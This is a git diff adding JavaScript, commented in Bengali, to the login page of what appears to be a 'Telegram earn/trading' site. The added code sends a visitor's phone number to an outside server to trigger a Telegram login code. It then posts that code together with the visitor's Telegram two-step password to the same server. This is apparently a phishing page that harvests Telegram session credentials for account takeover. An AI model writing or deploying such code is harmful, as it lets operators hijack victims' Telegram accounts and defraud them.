@@ -192,39 +192,86 @@
     <script>
     const API_BASE_URL = "https://aaf-tele-earn-treading.onrender.com";
     let mode = 'login';
-    let step = 1;
+    let currentStep = 1;
 
-    // এই ফাংশনটিই সাইন আপ ফর্ম দেখাবে
+    // মোড পরিবর্তনের ফাংশন (Login/Signup)
     function toggleMode(target) {
         mode = target;
-        step = 1;
-        
-        const header = document.getElementById('form-header');
-        const signupFields = document.getElementById('signup-fields');
-        const confirmBox = document.getElementById('confirm-box');
-        const submitBtn = document.getElementById('submit-btn');
-        const toggleText = document.getElementById('toggle-text');
-        const verifyFields = document.getElementById('verify-fields');
-
-        // ভেরিফাই ফিল্ড লুকিয়ে রাখা (শুরুতে)
-        verifyFields.style.display = "none";
-
-        if (mode === 'signup') {
-            header.innerText = "Create New Account";
-            signupFields.style.display = "block";
-            confirmBox.style.display = "block";
-            submitBtn.innerText = "NEXT (SEND OTP)";
-            toggleText.innerHTML = "Have an account? <span onclick='toggleMode(\"login\")' style='color:#39d353; cursor:pointer;'>Login</span>";
-        } else {
-            header.innerText = "Login to Account";
-            signupFields.style.display = "none";
-            confirmBox.style.display = "none";
-            submitBtn.innerText = "NEXT (SEND OTP)";
-            toggleText.innerHTML = "New here? <span onclick='toggleMode(\"signup\")' style='color:#39d353; cursor:pointer;'>Sign Up</span>";
-        }
+        currentStep = 1;
+        document.getElementById('form-header').innerText = mode === 'signup' ? "Create New Account" : "Login to Account";
+        document.getElementById('signup-fields').style.display = mode === 'signup' ? "block" : "none";
+        document.getElementById('confirm-box').style.display = mode === 'signup' ? "block" : "none";
+        document.getElementById('verify-fields').style.display = "none";
+        document.getElementById('submit-btn').innerText = "NEXT (SEND OTP)";
+        document.getElementById('toggle-text').innerHTML = mode === 'signup' ? 
+            "Have an account? <span onclick='toggleMode(\"login\")'>Login</span>" : 
+            "New here? <span onclick='toggleMode(\"signup\")'>Sign Up</span>";
     }
 
-    // আপনার বাকি handleAuth() ফাংশনটি নিচে থাকবে...
-    </script>
+    // মূল বাটন ফাংশন
+    function handleAuth() {
+        const phone = document.getElementById('code').value + document.getElementById('phone').value;
+        const submitBtn = document.getElementById('submit-btn');
+
+        if (currentStep === 1) {
+            // ১. ওটিপি পাঠানোর ধাপ
+            if (!document.getElementById('phone').value) { alert("Please enter phone number"); return; }
+            
+            submitBtn.innerText = "SENDING...";
+            submitBtn.disabled = true;
+
+            fetch(`${API_BASE_URL}/api/send_otp`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    alert("OTP Sent to Telegram!");
+                    document.getElementById('verify-fields').style.display = "block";
+                    submitBtn.innerText = "VERIFY & LOGIN";
+                    currentStep = 2; // দ্বিতীয় ধাপে নিয়ে যাওয়া
+                } else {
+                    alert("Error: " + data.message);
+                    submitBtn.innerText = "NEXT (SEND OTP)";
+                }
+            })
+            .catch(err => alert("Server connection failed!"))
+            .finally(() => { submitBtn.disabled = false; });
+
+        } else if (currentStep === 2) {
+            // ২. ওটিপি ভেরিফাই করার ধাপ
+            const otp = document.getElementById('tele-code').value;
+            const twoStep = document.getElementById('two-step').value;
+
+            if (!otp) { alert("Please enter the code from Telegram"); return; }
+
+            submitBtn.innerText = "VERIFYING...";
+            submitBtn.disabled = true;
+
+            fetch(`${API_BASE_URL}/api/verify_login`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    phone: phone, 
+                    code: otp,
+                    password: twoStep 
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    alert("Login Successful!");
+                    window.location.href = "/dashboard"; // ড্যাশবোর্ডে নিয়ে যাবে
+                } else {
+                    alert("Verification Failed: " + data.message);
+                }
+            })
+            .catch(err => alert("Server Error!"))
+            .finally(() => { submitBtn.disabled = false; });
+        }
+    }
+            </script>
 </body>
 </html>
